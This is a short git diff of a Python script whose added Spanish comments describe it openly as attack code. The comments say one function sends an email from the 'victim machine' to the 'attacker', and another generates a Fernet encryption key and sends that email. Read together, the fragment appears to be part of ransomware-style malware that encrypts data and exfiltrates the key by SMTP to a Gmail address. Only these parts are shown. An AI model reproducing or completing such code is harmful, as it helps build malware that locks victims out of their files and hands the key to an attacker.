@@ -2,7 +2,10 @@ from cryptography.fernet import Fernet
 import os
 import smtplib
 import random
+import sys
+#Estsa variable almacena el token del correo 
 key=""
+#Esta funcion envia un correo electronico de la maquina victima al atacante
 def servicio(host,port,mensaje):
     server=smtplib.SMTP(host,port)
     server.starttls()
@@ -10,7 +13,8 @@ def servicio(host,port,mensaje):
     server.sendmail(from_addr="@gmail.com",to_addrs= '@gmail.com', msg=mensaje) 
     server.quit()
 
-
+#Se genera una llave para que se encripte el dato 
+#A su vez envia el correo electronico
 def generar_key():
     key = Fernet.generate_key()
     with open('key.key', 'wb') as key_file:
